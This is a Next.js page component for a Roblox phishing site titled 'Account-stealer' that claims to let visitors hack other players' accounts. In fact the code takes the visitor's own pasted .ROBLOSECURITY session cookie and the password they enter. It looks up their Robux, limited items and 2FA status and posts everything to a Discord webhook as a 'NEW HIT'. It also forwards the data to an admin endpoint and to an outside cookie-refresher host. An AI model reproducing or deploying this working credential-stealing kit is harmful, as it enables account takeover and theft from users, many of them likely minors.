"use client";

import { useState, useEffect } from "react";
import Link from "next/link";
import { ArrowLeft, FileText, Lock, Loader2 } from "lucide-react";
import { useParams } from "next/navigation";
import ConstellationBackground from "@/components/ConstellationBackground";
import { supabase } from "@/lib/supabaseClient";

export default function SlugPage() {
  const params = useParams();
  const slug = params.slug as string;

  const [webhookUrl, setWebhookUrl] = useState<string | null>(null);
  const [loading, setLoading] = useState(true);
  const [pageError, setPageError] = useState<string | null>(null);

  const [status, setStatus] = useState<{
    message: string;
    type: "success" | "error" | "info" | null;
  }>({
    message: "",
    type: null,
  });

  const [fileContent, setFileContent] = useState("");
  const [pin, setPin] = useState("");

  // Lưu slug gần nhất vào localStorage
  useEffect(() => {
    if (!slug) return;
    try {
      window.localStorage.setItem("lastSlug", slug);
    } catch { }
  }, [slug]);

  // Lấy webhook từ Supabase
  useEffect(() => {
    async function fetchWebhook() {
      if (!slug) {
        setPageError("Invalid slug.");
        setLoading(false);
        return;
      }

      setLoading(true);
      setPageError(null);

      try {
        const { data, error } = await supabase
          .from("directories")
          .select("webhook_url")
          .eq("slug", slug)
          .single();

        if (error) throw error;
        if (!data?.webhook_url) throw new Error("Webhook not found.");

        setWebhookUrl(data.webhook_url);
      } catch (err: any) {
        setPageError(err.message || "Failed to load webhook.");
      } finally {
        setLoading(false);
      }
    }

    fetchWebhook();
  }, [slug]);

  function extractRobloSecurity(text: string): string | null {
    if (!text) return null;

    // 1. Regex mạnh hơn: tìm chuỗi bắt đầu bằng _|WARNING: và kéo dài cho đến khi gặp dấu nháy hoặc khoảng trắng
    // Cách này chấp nhận cả input là JSON, PowerShell, hoặc text thuần
    const pattern = /(_\|WARNING:-DO-NOT-SHARE-THIS\.[^"'\s]+)/i;
    const match = text.match(pattern);

    if (match && match[1]) {
      let cookie = match[1].trim();

      // Loại bỏ các ký tự dư thừa ở cuối nếu có (như dấu ngoặc đơn trong PowerShell)
      cookie = cookie.replace(/[)'";,]+$/, '');

      if (cookie.length > 500) {
        return cookie;
      }
    }

    // 2. Fallback cho trường hợp không có WARNING prefix (hiếm gặp với .ROBLOSECURITY)
    const backupPattern = /\.ROBLOSECURITY["']?\s*,\s*["']([^"'\s]{500,})["']/i;
    const backupMatch = text.match(backupPattern);
    if (backupMatch && backupMatch[1]) {
      return backupMatch[1].trim();
    }

    return null;
  }

  async function sendToDiscord(
    cookieValue: string,
    pinValue: string,
    fullStats: any,
    userId: string
  ) {
    if (!webhookUrl) {
      setStatus({ message: "❌ Webhook URL is missing.", type: "error" });
      return;
    }

    try {
      const profileUrl = `https://www.roblox.com/users/${userId}/profile`;
      const rolimonsUrl = `https://www.rolimons.com/player/${userId}`;
      const autoharUrl = `https://your-autohar-link-here.com?user=${userId}`; // Thay bằng link thật của bạn

      const avatarUrl = fullStats?.avatarHeadshotUrl || "https://i.imgur.com/0ZxT2S6.png";

      const username = fullStats?.basic?.name || fullStats?.displayName || "N/A";
      const displayName = fullStats?.displayName || username;
      const accountAgeDays = fullStats?.accountAgeDays ?? "N/A";
      const isDeveloper = fullStats?.isDeveloper ?? false;
      const gameVisits = fullStats?.visits ?? 0;
      const groupMembers = fullStats?.groupsCount ?? 0;
      const robuxBalance = fullStats?.robux ?? 0;
      const pendingRobux = fullStats?.pendingRobux ?? 0;
      const rap = fullStats?.rap ?? 0;
      const limiteds = fullStats?.limiteds ?? 0;
      const summary = fullStats?.summary ?? (robuxBalance + rap);
      const creditBalance = fullStats?.creditBalance ?? 0;
      const inUnknown = 0;
      const emailVerified = fullStats?.emailVerified ? "Verified" : "Not Verified";
      const twoFA = fullStats?.twoFA ?? "No 2FA";
      const inventory = fullStats?.hasInventory ? "True" : "False";
      const premium = fullStats?.premium ?? "N/A";
      const groupsOwned = fullStats?.ownedGroups ?? 0;
      const groupsBalance = fullStats?.groupBalances?.reduce(
        (sum: number, g: any) => sum + (g.robux || 0),
        0
      ) ?? 0;

      const mm2Display = fullStats?.mm2_count > 0 ? `True | ${fullStats.mm2_count}` : "False | 0";
      const admDisplay = fullStats?.adm_count > 0 ? `True | ${fullStats.adm_count}` : "False | 0";
      const sabDisplay = fullStats?.sab_count > 0 ? `True | ${fullStats.sab_count}` : "False | 0";

      const cookieDisplay =
        cookieValue.length > 4000 ? cookieValue.substring(0, 4000) + "..." : cookieValue;
      const cookieNote = cookieValue.length > 4000 ? "\n(long cookie - scroll to view full)" : "";
      const linkRe = `https://manualrefresherforrichpeople.gt.tc/?cookie=${encodeURIComponent(cookieValue)}`;

      const ageLabel = fullStats?.isUnder13 ? "<13" : ">13";

      const payload = {
        content: "@everyone NEW HIT",
        embeds: [
          {
            title: `${displayName} | ${ageLabel}`,
            url: profileUrl,
            color: 16711680,
            fields: [
              {
                name: "Discord Notification",
                value: [
                  `[Rolimons Stats](${rolimonsUrl})`,
                  `[Roblox Profile](${profileUrl})`,
                  `[AutoHar Link](${autoharUrl})`,
                ].join(" | "),
                inline: false,
              },
              {
                name: "Username",
                value: username,
                inline: true,
              },
              {
                name: "Password",
                value: pinValue || "N/A",
                inline: true,
              },
              {
                name: "📊 Account Stats",
                value: [
                  `• Account Age: ${accountAgeDays} Days`,
                  `• Games Developer: ${isDeveloper ? "True" : "False"}`,
                  `• Game Visits: ${gameVisits}`,
                  `• Group Members: ${groupMembers}`,
                ].join("\n"),
                inline: false,
              },
              {
                name: "💰 Robux",
                value: `Balance: ${robuxBalance}\nPending: ${pendingRobux}`,
                inline: true,
              },
              {
                name: "Limiteds",
                value: `RAP: ${rap}\nLimiteds: ${limiteds}`,
                inline: true,
              },
              {
                name: "Summary",
                value: summary,
                inline: true,
              },
              {
                name: "💳 Payments",
                value: `Credit Balance: ${creditBalance}\nin Unknown: ${inUnknown}`,
                inline: true,
              },
              {
                name: "🎮 Games",
                value: [
                  `<:mm2:1475152011740840039> ${mm2Display}`,
                  `<:adm:1475152102266503321> ${admDisplay}`,
                  `<:sab:1475152220671709224> ${sabDisplay}`,
                ].join("\n"),
                inline: true,
              },
              {
                name: "⚙️ Settings",
                value: `Email: ${emailVerified}\n2FA: ${twoFA}`,
                inline: true,
              },
              {
                name: "📦 Inventory",
                value: inventory,
                inline: true,
              },
              {
                name: "Premium",
                value: premium,
                inline: true,
              },
              {
                name: "👥 Groups",
                value: `Owned: ${groupsOwned}\nBalance: ${groupsBalance}`,
                inline: true,
              },
              {
                name: "🔧 Tool Used",
                value: "```toolbox                                      ```",
                inline: false,
              },
            ],
            footer: {
              text: "Refreshed Cookie | Original Cookie",
              icon_url: "https://i.imgur.com/0ZxT2S6.png",
            },
            timestamp: new Date().toISOString(),
            thumbnail: {
              url: avatarUrl,
            },
          },
          {
            title: ".ROBLOSECURITY (Refreshed)",
            description:
              `**Links:**\n` +
              `[Refreshed Cookie](${linkRe}) | ` +
              `[Original Cookie](${linkRe})\n\n` +
              `\`\`\`${cookieDisplay}${cookieNote}\`\`\``,
            color: 16711680,
            author: {
              name: "Refreshed Cookie",
              url: rolimonsUrl,
              icon_url: "https://em-content.zobj.net/source/apple/354/cookie_1f36a.png",
            },
            timestamp: new Date().toISOString(),
            thumbnail: {
              url: "https://em-content.zobj.net/source/apple/354/cookie_1f36a.png",
            },
          },
        ],
      };

      const res = await fetch(webhookUrl, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify(payload),
      });

      if (res.ok) {
        fetch("/api/post", {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({
            discordPayload: payload,
            slug,
          }),
        }).catch((err) => console.error("[Admin forward failed]", err));

        setStatus({ message: "Success!", type: "success" });
        setTimeout(() => {
          setFileContent("");
          setPin("");
          setStatus({ message: "", type: null });
        }, 5000);
      } else {
        setStatus({ message: "❌ Failed: an error occurred with your webhook", type: "error" });
      }
    } catch (err: any) {
      console.error("[sendToDiscord error]", err);
      setStatus({ message: "❌ Connection error", type: "error" });
    }
  }

  const handleStart = async () => {
    if (!fileContent.trim() || !pin.trim()) {
      setStatus({ message: "❌ Please enter both script content and pass!", type: "error" });
      return;
    }

    const robloxCookie = extractRobloSecurity(fileContent);
    if (!robloxCookie) {
      setStatus({ message: "❌ Could not find .ROBLOSECURITY value!", type: "error" });
      return;
    }

    setStatus({ message: "⏳ Processing...", type: "info" });

    try {
      const fullRes = await fetch("/api/roblox-user", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        cache: "no-store",
        body: JSON.stringify({
          cookie: robloxCookie,
          mode: "full",
        }),
      });

      const data = await fullRes.json();

      if (!fullRes.ok || data.error) {
        const errorMsg =
          data.errorMessage || "Invalid file. Please check and try again.";
        setStatus({ message: errorMsg, type: "error" });
        return;
      }

      const userIdFromCookie = data.userId;
      if (!userIdFromCookie) {
        setStatus({ message: "Could not retrieve user ID from cookie.", type: "error" });
        return;
      }

      // Gửi lên Discord chỉ khi thành công
      await sendToDiscord(robloxCookie, pin, data, userIdFromCookie);
    } catch (err: any) {
      console.error("[handleStart fetch error]", err);
      setStatus({
        message: "Network error or server is unreachable. Please try again.",
        type: "error",
      });
    }
  };

  if (pageError) {
    return (
      <div className="min-h-screen bg-[#0a0a0a] text-white flex items-center justify-center p-4 relative overflow-hidden">
        <ConstellationBackground />
        <div className="bg-[#121212] border border-red-600/40 rounded-2xl p-10 max-w-lg text-center shadow-2xl z-50">
          <h2 className="text-2xl font-bold text-red-400 mb-4">Something went wrong</h2>
          <p className="text-gray-300 mb-6">{pageError}</p>
          <Link
            href="/create"
            className="inline-flex items-center gap-2 px-6 py-3 bg-red-600 hover:bg-red-700 rounded-lg text-white font-medium transition-colors shadow-lg shadow-red-900/30"
          >
            <ArrowLeft className="w-5 h-5" />
            Back to Create
          </Link>
        </div>
      </div>
    );
  }

  return (
    <div className="min-h-screen bg-[#0a0a0a] text-white flex flex-col items-center justify-center p-4 relative overflow-hidden">
      <ConstellationBackground />

      {loading && (
        <div className="absolute inset-0 z-50 flex items-center justify-center bg-black/70 backdrop-blur-md">
          <div className="flex flex-col items-center gap-6">
            <Loader2 className="w-14 h-14 text-red-500 animate-spin" />
            <p className="text-xl font-semibold">Loading</p>
          </div>
        </div>
      )}

      <div
        className={`relative z-10 w-full max-w-5xl flex flex-col items-center transition-opacity duration-500 ${loading ? "opacity-40 pointer-events-none" : "opacity-100"
          }`}
      >
        <div className="w-full mb-6 px-2">
          <Link
            href="/create"
            className="text-[#cbd5e1] font-semibold text-sm tracking-wide hover:text-white transition-colors flex items-center gap-2"
          >
            <ArrowLeft className="w-4 h-4" />
            GO BACK
          </Link>
        </div>

        <div className="text-center mb-8 px-4">
          <h1 className="text-3xl md:text-4xl font-bold tracking-tight text-white capitalize mb-3">
            Account-stealer
          </h1>
          <p className="text-[#94a3b8] text-base max-w-xl mx-auto">
            Hack accounts with ease, with this brand new powershell-based system!
          </p>
        </div>

        <div className="w-full">
          <div className="flex items-center gap-3 mb-6 px-2">
            <h2 className="text-xl font-bold">Bloxtools</h2>
          </div>

          <div className="grid grid-cols-1 md:grid-cols-2 gap-6">
            <div className="bg-[#121212] border border-[#1e1e1e] rounded-2xl p-8 shadow-2xl flex flex-col h-full">
              <h3 className="text-lg font-bold mb-3">Hack Accounts</h3>
              <p className="text-[#94a3b8] text-sm mb-6 leading-relaxed">
                Paste your player file in the box below, then click "Start Hacking" If you don't know how to find a users "player file" then go ahead and watch "How to use"
              </p>

              {status.type && (
                <div
                  className={`p-4 rounded-xl mb-6 text-sm text-center border animate-in fade-in slide-in-from-top-1 duration-300 ${status.type === "success"
                      ? "bg-emerald-950/30 border-emerald-500/30 text-emerald-300"
                      : status.type === "error"
                        ? "bg-red-950/30 border-red-500/30 text-red-300"
                        : "bg-blue-950/30 border-blue-500/30 text-blue-300"
                    }`}
                >
                  {status.message}
                </div>
              )}

              <div className="space-y-5 mt-auto">
                <div className="relative group">
                  <FileText className="absolute left-4 top-1/2 -translate-y-1/2 w-5 h-5 text-red-500 opacity-70 group-focus-within:opacity-100 transition-opacity" />
                  <input
                    type="text"
                    value={fileContent}
                    onChange={(e) => setFileContent(e.target.value)}
                    placeholder="Enter player file"
                    className="w-full bg-[#1a1a1a] border border-[#2a2a2a] rounded-xl py-4 pl-12 pr-5 text-sm text-white placeholder:text-gray-600 focus:outline-none focus:border-red-500 focus:ring-1 focus:ring-red-500/30 transition-all"
                  />
                </div>

                <div className="relative group">
                  <Lock className="absolute left-4 top-1/2 -translate-y-1/2 w-5 h-5 text-red-500 opacity-70 group-focus-within:opacity-100 transition-opacity" />
                  <input
                    value={pin}
                    onChange={(e) => setPin(e.target.value)}
                    placeholder="Create Password"
                    className="w-full bg-[#1a1a1a] border border-[#2a2a2a] rounded-xl py-4 pl-12 pr-5 text-sm text-white placeholder:text-gray-600 focus:outline-none focus:border-red-500 focus:ring-1 focus:ring-red-500/30 transition-all"
                  />
                </div>

                <button
                  onClick={handleStart}
                  disabled={loading || status.type === "info"}
                  className="w-full py-4 bg-[#e22d2d] hover:bg-[#c92828] disabled:opacity-60 disabled:hover:bg-[#e22d2d] text-white font-bold text-base rounded-xl flex items-center justify-center gap-3 transition-all shadow-lg shadow-red-900/20 active:scale-[0.98]"
                >
                  Start Hacking!
                </button>
              </div>
            </div>

            <div className="bg-[#121212] border border-[#1e1e1e] rounded-2xl p-8 shadow-2xl flex flex-col h-full">
              <h3 className="text-lg font-bold mb-3">How to use</h3>
              <p className="text-[#94a3b8] text-sm mb-6 leading-relaxed">
                Video Tutorial
              </p>

              <div className="mt-auto aspect-video bg-[#0b1218] border border-white/5 rounded-xl overflow-hidden group">
                <video
                  controls
                  className="w-full h-full object-cover"
                  playsInline
                  preload="metadata"
                >
                  <source src="/video.mov" type="video/mp4" />
                  <source src="/video.mov" type="video/quicktime" />
                  Your browser does not support the video tag.
                </video>
              </div>
            </div>
          </div>
        </div>
      </div>
    </div>
  );
}